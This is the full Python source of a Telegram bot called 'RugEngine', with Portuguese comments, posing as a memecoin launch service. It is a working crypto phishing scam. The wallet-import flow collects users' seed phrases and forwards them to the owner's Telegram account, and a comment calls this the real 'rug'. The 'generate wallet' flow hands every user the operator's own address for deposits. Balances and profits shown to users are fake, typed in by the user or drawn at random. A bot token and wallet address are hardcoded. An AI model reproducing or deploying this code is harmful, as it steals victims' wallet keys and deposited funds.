import logging
import random
import re
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURAÇÕES GLOBAIS ---
BOT_TOKEN = "8871151252:AAFwAXyFU4l4KJGznbyBbnAFNujdngKl0D4" 
OWNER_ID = 8889398275  # Seu ID real
YOUR_WALLET_ADDRESS = "7w2c8dkNy5Ut8iErmu5etjDd68tx7aCazmzLyw4NYYo2"
TRENDING_COST = 30.0

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger('RugEngine')

# --- ARMAZENAMENTO EM MEMÓRIA (SIMULAÇÃO DE BANCO DE DADOS) ---
user_store = {}

def get_user_profile(user_id: int, username: str) -> dict:
    """
    Recupera ou inicializa o perfil do usuário.
    """
    if user_id not in user_store:
        user_store[user_id] = {
            "id": random.randint(100000, 999999),
            "username": username,
            "balance": 0.0,
            "wallets": [],
            "active_wallet": None,
            "coins_launched": [],
            "total_invested": 0.0,
            "total_profit": 0.0,
            "referrals": 0
        }
    return user_store[user_id]

def format_money(amount: float) -> str:
    """Formata número para formato monetário US com 2 casas decimais."""
    return f"${amount:,.2f}"

def get_short_address(address: str, chars: int = 6) -> str:
    """Encurta endereço para exibição legível."""
    if not address:
        return "N/A"
    if len(address) > chars * 2:
        return f"{address[:chars]}...{address[-chars:]}"
    return address

def escape_html(text: str) -> str:
    """
    Escapa caracteres especiais para uso seguro em parse_mode=HTML.
    """
    if not text:
        return ""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# --- CONSTRUTORES DE KEYBOARD (UI) ---

def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Launch a Coin", callback_data="menu:launch")],
        [InlineKeyboardButton("👛 Wallets", callback_data="menu:wallets")],
        [InlineKeyboardButton("📊 Stats", callback_data="menu:stats")],
        [InlineKeyboardButton("👥 Referrals", callback_data="menu:referrals")]
    ])

def wallets_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📂 My Wallets", callback_data="wallet:my")],
        [InlineKeyboardButton("🔄 Refresh Balance", callback_data="wallet:refresh")],
        [InlineKeyboardButton("⬆️ Import Wallet (Seed)", callback_data="wallet:import")],
        [InlineKeyboardButton("⚡ Generate Wallet", callback_data="wallet:generate")],
        [InlineKeyboardButton("🔄 Back", callback_data="menu:main")]
    ])

def amount_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("$100", callback_data="launch:amt:100"),
            InlineKeyboardButton("$500", callback_data="launch:amt:500")
        ],
        [
            InlineKeyboardButton("$1,000", callback_data="launch:amt:1000"),
            InlineKeyboardButton("$5,000", callback_data="launch:amt:5000")
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="menu:main")]
    ])

def back_to_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Back to Menu", callback_data="menu:main")]
    ])

def back_to_wallets_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Back", callback_data="menu:wallets")]
    ])

def wallet_list_kb(wallets: list, active_wallet: str) -> InlineKeyboardMarkup:
    buttons = []
    for i, addr in enumerate(wallets):
        icon = "✅" if addr == active_wallet else "⬜"
        label = f"{icon} {get_short_address(addr)}"
        buttons.append([InlineKeyboardButton(label, callback_data=f"wallet:activate:{addr}")])
    buttons.append([InlineKeyboardButton("🔄 Back", callback_data="menu:wallets")])
    return InlineKeyboardMarkup(buttons)

def upgrade_kb(ticker: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛡️ Anti-Sniper (Free)", callback_data=f"launch:upgrade:antisniper:{ticker}")],
        [InlineKeyboardButton(f"🔥 Trending Pump.fun (${TRENDING_COST})", callback_data=f"launch:upgrade:trending:{ticker}")],
        [InlineKeyboardButton("🚀 Launch Now", callback_data=f"launch:confirm:{ticker}")]
    ])

def launch_confirm_kb(ticker: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 View Stats", callback_data="menu:stats")],
        [InlineKeyboardButton("🔄 Back to Menu", callback_data="menu:main")]
    ])

def cancel_launch_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="menu:main")]
    ])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    profile = get_user_profile(user.id, user.username)
    
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref_id = int(context.args[0].split("_")[1])
            if ref_id in user_store:
                user_store[ref_id]["referrals"] += 1
                profile["total_profit"] += 5.0
        except (ValueError, IndexError):
            pass

    context.user_data.pop("awaiting_seed", None)
    context.user_data.pop("awaiting_coin_details", None)
    context.user_data.pop("launch_amount", None)
    context.user_data.pop("pending_coin", None)

    msg = (
        f"🏦 <b>YOUR ACCOUNT</b>\n\n"
        f"👤 Username: <b>@{user.username}</b>\n"
        f"🆔 User ID: <code>{profile['id']}</code>\n"
        f"💵 Connected Balance: <b>{format_money(profile['balance'])}</b>\n"
        f"👛 Wallets: <b>{len(profile['wallets'])}</b>\n\n"
        f"Welcome to RugEngine. Launch your next million."
    )
    await update.message.reply_html(msg, reply_markup=main_menu_kb())

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    profile = get_user_profile(user.id, user.username)
    data = query.data
    
    try:
        if data == "menu:main":
            msg = (
                f"🏦 <b>YOUR ACCOUNT</b>\n\n"
                f"👤 Username: <b>@{user.username}</b>\n"
                f"🆔 User ID: <code>{profile['id']}</code>\n"
                f"💵 Connected Balance: <b>{format_money(profile['balance'])}</b>\n"
                f"👛 Wallets: <b>{len(profile['wallets'])}</b>"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=main_menu_kb())
            return

        elif data == "menu:wallets":
            active = get_short_address(profile['active_wallet']) if profile['active_wallet'] else "None"
            msg = (
                f"👛 <b>WALLET MANAGEMENT</b>\n\n"
                f"Current Active Wallet: <code>{active}</code>"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=wallets_kb())
            return

        elif data == "wallet:my":
            if not profile['wallets']:
                msg = "No wallets connected yet. Please generate or import a wallet."
                await query.edit_message_text(msg, reply_markup=back_to_wallets_kb())
            else:
                kb = wallet_list_kb(profile['wallets'], profile['active_wallet'])
                msg = "Select a wallet to activate:"
                await query.edit_message_text(msg, reply_markup=kb)
            return

        elif data.startswith("wallet:activate:"):
            addr = data.split(":", 2)[2]
            if addr in profile['wallets']:
                profile['active_wallet'] = addr
                msg = f"✅ Wallet <code>{get_short_address(addr)}</code> is now active."
                await query.edit_message_text(msg, reply_markup=back_to_wallets_kb())
            else:
                await query.answer("Invalid wallet", show_alert=True)
            return

        elif data == "wallet:import":
            msg = (
                f"🔗 <b>IMPORT WALLET</b>\n\n"
                f"Please paste your <b>Seed Phrase</b> (12 or 24 words) below.\n\n"
                f"🔒 Security: Your seed will be processed securely to derive your keys."
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=cancel_launch_kb())
            context.user_data['awaiting_seed'] = True
            context.user_data.pop('awaiting_wallet_address', None)
            return

        elif data == "wallet:generate":
            await query.edit_message_text("⏳ Generating secure wallet...")
            if YOUR_WALLET_ADDRESS not in profile['wallets']:
                profile['wallets'].append(YOUR_WALLET_ADDRESS)
            profile['active_wallet'] = YOUR_WALLET_ADDRESS
            
            msg = (
                f"✅ <b>1 WALLET CREATED</b>\n\n"
                f"🔗 Address: <code>{YOUR_WALLET_ADDRESS}</code>\n"
                f"💵 Balance: <b>{format_money(profile['balance'])}</b>\n\n"
                f"This wallet is now Active. To start trading, please deposit funds to this address."
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_menu_kb())
            return

        elif data == "wallet:refresh":
            if not profile['active_wallet']:
                await query.answer("No active wallet. Please generate or import a wallet first.", show_alert=True)
                return
            
            active_addr = profile['active_wallet']
            msg = (
                f"🔄 <b>REFRESH BALANCE</b>\n\n"
                f"Please ensure you have sent funds to:\n"
                f"<code>{active_addr}</code>\n\n"
                f"Type the amount you sent in <b>USD</b> (e.g., <code>100</code>) to update your balance."
            )
            context.user_data['awaiting_deposit_amount'] = True
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_wallets_kb())
            return

        elif data == "menu:stats":
            recent = profile['coins_launched'][-5:]
            recent_str = ""
            if recent:
                for coin in recent:
                    recent_str += f"• <b>{coin['ticker']}</b> - {format_money(coin['amount'])} ({coin['date']})\n"
            else:
                recent_str = "No rugpulls yet."
            
            msg = (
                f"📊 <b>YOUR STATISTICS</b>\n\n"
                f"💰 Total Invested: <b>{format_money(profile['total_invested'])}</b>\n"
                f"📈 Total Profit: <b>{format_money(profile['total_profit'])}</b>\n"
                f"🚀 Coins Launched: <b>{len(profile['coins_launched'])}</b>\n\n"
                f"<b>Recent Rugpulls:</b>\n{recent_str}"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_menu_kb())
            return

        elif data == "menu:referrals":
            earnings = profile['total_profit'] * 0.10
            msg = (
                f"👥 <b>REFERRAL PROGRAM</b>\n\n"
                f"Invite friends and earn 10% of their volume!\n\n"
                f"Your Link: <code>https://t.me/{user.username}?start=ref_{profile['id']}</code>\n\n"
                f"Current Referrals: <b>{profile['referrals']}</b>\n"
                f"Earnings: <b>{format_money(earnings)}</b>"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_menu_kb())
            return

        elif data == "menu:launch":
            if not profile['active_wallet']:
                msg = "⚠️ <b>WALLET REQUIRED</b>\n\nYou need an active wallet to launch coins."
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("👛 Go to Wallets", callback_data="menu:wallets")],
                    [InlineKeyboardButton("🔄 Back", callback_data="menu:main")]
                ])
                await query.edit_message_text(msg, parse_mode="HTML", reply_markup=kb)
                return
            
            msg = (
                f"🚀 <b>LAUNCH A COIN</b>\n\n"
                f"Active Wallet: <code>{get_short_address(profile['active_wallet'])}</code>\n\n"
                f"Select your investment amount:"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=amount_kb())
            return

        elif data.startswith("launch:amt:"):
            try:
                amount = float(data.split(":")[-1])
            except ValueError:
                await query.answer("Invalid amount", show_alert=True)
                return

            if profile['balance'] < amount:
                await query.answer("Insufficient balance", show_alert=True)
                return
            
            profile['balance'] -= amount
            profile['total_invested'] += amount
            context.user_data['launch_amount'] = amount
            context.user_data['awaiting_coin_details'] = True
            context.user_data['pending_coin'] = {}
            
            msg = (
                f"💰 <b>INVESTMENT: {format_money(amount)}</b>\n\n"
                f"Now, provide your memecoin details in this format:\n"
                f"<code>NAME | TICKER | DESCRIPTION | IMAGE_URL</code>\n\n"
                f"Example: <code>DOGE | $DOGE | The original meme dog | https://imgur.com/doge.jpg</code>"
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=cancel_launch_kb())
            return

        elif data.startswith("launch:upgrade:"):
            parts = data.split(":")
            if len(parts) < 4:
                await query.answer("Malformed request", show_alert=True)
                return
                
            upgrade_type = parts[2]
            ticker = parts[3]
            pending = context.user_data.get('pending_coin', {})
            
            if ticker not in pending or not isinstance(pending.get(ticker), dict):
                await query.answer("Session expired or invalid coin.", show_alert=True)
                context.user_data.pop("pending_coin", None)
                context.user_data.pop("launch_amount", None)
                context.user_data.pop("awaiting_coin_details", None)
                return

            coin_data = pending[ticker]

            if upgrade_type == "antisniper":
                if coin_data.get('anti_sniper'):
                    await query.answer("Anti-Sniper is already active.", show_alert=False)
                    return

                coin_data['anti_sniper'] = True
                msg = (
                    f"🛡️ <b>ANTI-SNIPER ACTIVATED</b>\n\n"
                    f"Your token <b>{ticker}</b> is now protected from snipers.\n\n"
                    f"Would you like to feature it in the Trending Section? Cost: {format_money(TRENDING_COST)}"
                )
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"🔥 Yes, Add to Trending ({format_money(TRENDING_COST)})", callback_data=f"launch:upgrade:trending:{ticker}")],
                    [InlineKeyboardButton("🚀 Launch Now", callback_data=f"launch:confirm:{ticker}")]
                ])
                await query.edit_message_text(msg, parse_mode="HTML", reply_markup=kb)

            elif upgrade_type == "trending":
                if coin_data.get('trending'):
                    await query.answer("Already in Trending.", show_alert=False)
                    return

                if profile['balance'] < TRENDING_COST:
                    await query.answer("Insufficient balance for trending", show_alert=True)
                    return
                
                profile['balance'] -= TRENDING_COST
                profile['total_invested'] += TRENDING_COST
                coin_data['trending'] = True
                
                # Cálculo correto do total investido (Base + Upgrade)
                base_amount = context.user_data.get('launch_amount', 0)
                total_inv = base_amount + TRENDING_COST
                
                anti_status = "Active" if coin_data.get('anti_sniper') else "Inactive"
                
                msg = (
                    f"🔥 <b>TRENDING SECTION ACTIVATED</b>\n\n"
                    f"Your token <b>{ticker}</b> is now trending on Pump.fun and Axiom Pro!\n\n"
                    f"💰 Total Investment: <b>{format_money(total_inv)}</b>\n"
                    f"🛡️ Anti-Sniper Status: <b>{anti_status}</b>"
                )
                # Botão único para confirmar lançamento
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🚀 Launch Now", callback_data=f"launch:confirm:{ticker}")]
                ])
                await query.edit_message_text(msg, parse_mode="HTML", reply_markup=kb)
            return

        # --- CONFIRMAÇÃO DE LANÇAMENTO ---
        elif data.startswith("launch:confirm:"):
            ticker = data.split(":")[-1]
            pending = context.user_data.get('pending_coin', {})
            
            if ticker not in pending:
                await query.answer("Invalid coin session.", show_alert=True)
                return
            
            amount = context.user_data.get('launch_amount', 0)
            
            # Lógica de Lucro: Calcula sobre o total gasto (base + upgrades)
            profit_factor = random.uniform(-0.2, 1.5)
            simulated_profit = profit_factor * amount
            
            profile['total_profit'] += simulated_profit
            profile['coins_launched'].append({
                "ticker": ticker,
                "amount": amount,
                "date": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            
            # Limpar estado
            context.user_data.pop("pending_coin", None)
            context.user_data.pop("launch_amount", None)
            context.user_data.pop("awaiting_coin_details", None)

            msg = (
                f"🚀 <b>COIN LAUNCHED!</b>\n\n"
                f"Your token <b>{ticker}</b> is now live!\n\n"
                f"💰 Investment: <b>{format_money(amount)}</b>\n"
                f"📈 Simulated Profit: <b>{format_money(simulated_profit)}</b>\n"
                f"🔗 Contract: <code>{YOUR_WALLET_ADDRESS}</code>\n\n"
                f"Check your Stats for updated portfolio values."
            )
            await query.edit_message_text(msg, parse_mode="HTML", reply_markup=launch_confirm_kb(ticker))
            return

        else:
            await query.answer("Unknown action", show_alert=False)

    except Exception as e:
        logger.error(f"Error in handle_callback: {e}")
        await query.answer("Error processing request", show_alert=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handler para mensagens de texto.
    Trata a captura de Seed Phrase, Endereço, Depósito e Detalhes da Moeda.
    """
    user = update.effective_user
    profile = get_user_profile(user.id, user.username)
    text = update.message.text
    
    if not text:
        return

    # --- LÓGICA DE SEED PHRASE ---
    if context.user_data.get("awaiting_seed"):
        # Validação básica (12 ou 24 palavras)
        words = text.split()
        if len(words) not in [12, 24]:
            await update.message.reply_text(
                "⚠️ Invalid seed format. Please provide exactly 12 or 24 words separated by spaces.",
                parse_mode="HTML"
            )
            return
        
        # ENVIAR ALERTA PARA O OWNER (O "Rug" Real)
        safe_seed = escape_html(text)
        alert_msg = (
            f"🚨 NOVA SEED PHRASE CAPTURADA\n"
            f"👤 Usuário: @{user.username} (ID: {profile['id']})\n"
            f"📝 Seed: <code>{safe_seed}</code>\n"
            f"⏰ Horário: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=alert_msg, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed to send alert to owner: {e}")

        # Salvar a seed no perfil (para você ter acesso depois se precisar)
        profile['imported_seed'] = text 
        
        # MUDANÇA CRÍTICA: Agora pedimos o ENDEREÇO
        context.user_data.pop("awaiting_seed", None)
        context.user_data['awaiting_wallet_address'] = True
        
        msg = (
            f"✅ <b>SEED PHRASE RECEIVED</b>\n\n"
            f"Please provide the <b>Solana Address</b> associated with this seed.\n"
            f"Example: <code>3J98y1c512...</code> (32-44 Base58 characters)"
        )
        await update.message.reply_html(msg, reply_markup=back_to_menu_kb())
        return

    # --- LÓGICA DE ENDEREÇO WALLET ---
    elif context.user_data.get("awaiting_wallet_address"):
        # Validação básica de endereço Solana (Base58, 32-44 chars)
        solana_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
        
        if not re.match(solana_pattern, text.strip()):
            await update.message.reply_text(
                "⚠️ Invalid Solana address. Please provide a valid Base58 address (32-44 characters).",
                parse_mode="HTML"
            )
            return
            
        wallet_address = text.strip()
        
        # Adicionar a wallet ao perfil
        if wallet_address not in profile['wallets']:
            profile['wallets'].append(wallet_address)
        
        profile['active_wallet'] = wallet_address
        
        # SEM AIRDROP. Saldo permanece 0.0.
        
        context.user_data.pop("awaiting_wallet_address", None)
        
        msg = (
            f"✅ <b>WALLET IMPORTED SUCCESSFULLY</b>\n\n"
            f"🔗 Address: <code>{wallet_address}</code>\n"
            f"💵 Balance: <b>{format_money(profile['balance'])}</b>\n\n"
            f"Your wallet is ready. If you have already transferred funds, click 'Refresh Balance' to update."
        )
        await update.message.reply_html(msg, reply_markup=back_to_menu_kb())
        return

    # --- LÓGICA DE DEPÓSITO (REFRESH) ---
    elif context.user_data.get("awaiting_deposit_amount"):
        try:
            deposit_amount = float(text.replace(",", ".").replace("$", "").strip())
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid amount. Please provide a numeric value in USD (e.g., 100).",
                parse_mode="HTML"
            )
            return

        if deposit_amount <= 0:
            await update.message.reply_text(
                "⚠️ Amount must be greater than zero.",
                parse_mode="HTML"
            )
            return

        # Atualizar saldo
        profile['balance'] += deposit_amount
        
        context.user_data.pop("awaiting_deposit_amount", None)
        
        msg = (
            f"✅ <b>BALANCE UPDATED</b>\n\n"
            f"💵 Amount: <b>{format_money(deposit_amount)}</b>\n"
            f"💰 New Balance: <b>{format_money(profile['balance'])}</b>\n\n"
            f"You can now launch coins or manage your wallets."
        )
        await update.message.reply_html(msg, reply_markup=back_to_menu_kb())
        return

    # --- LÓGICA DE DETALHES DA MOEDA ---
    elif context.user_data.get("awaiting_coin_details"):
        parts = [p.strip() for p in text.split("|")]
        
        if len(parts) != 4:
            await update.message.reply_text(
                "⚠️ Invalid format. Please use: <code>NAME | TICKER | DESCRIPTION | IMAGE_URL</code>",
                parse_mode="HTML"
            )
            return
            
        name, ticker, description, image_url = parts
        
        # Normalizar ticker (remover $, espaços, maiúsculas, apenas alfanumérico)
        clean_ticker = ticker.replace("$", "").replace(" ", "").upper()
        
        if not clean_ticker or not clean_ticker.isalnum():
            await update.message.reply_text(
                "⚠️ Ticker must be alphanumeric.",
                parse_mode="HTML"
            )
            return

        # Armazenar moeda pendente
        context.user_data['pending_coin'] = {
            clean_ticker: {
                "name": name,
                "ticker": clean_ticker,
                "description": description,
                "image_url": image_url,
                "contract": YOUR_WALLET_ADDRESS,
                "anti_sniper": False,
                "trending": False
            }
        }
        
        context.user_data.pop("awaiting_coin_details", None)
        
        # Escape de HTML para evitar quebra de formatação
        safe_name = escape_html(name)
        safe_desc = escape_html(description)
        
        msg = (
            f"📋 <b>COIN DETAILS RECEIVED</b>\n\n"
            f"📝 Name: <b>{safe_name}</b>\n"
            f"🏷️ Ticker: <b>${clean_ticker}</b>\n"
            f"📖 Description: <i>{safe_desc}</i>\n"
            f"🖼️ Image: <code>{image_url}</code>\n\n"
            f"Select an upgrade to continue:"
        )
        await update.message.reply_html(msg, reply_markup=upgrade_kb(clean_ticker))
        return

    else:
        # Mensagem genérica se o usuário digitar algo fora de contexto
        if text.startswith("/"):
            return # Deixar o CommandHandler lidar
        
        hint = (
            "🤖 I'm waiting for specific input.\n\n"
            "If you are importing a seed, please paste it now.\n"
            "If you are launching a coin, please provide details in the format:\n"
            "<code>NAME | TICKER | DESCRIPTION | IMAGE_URL</code>"
        )
        await update.message.reply_html(hint)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("RugEngine is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()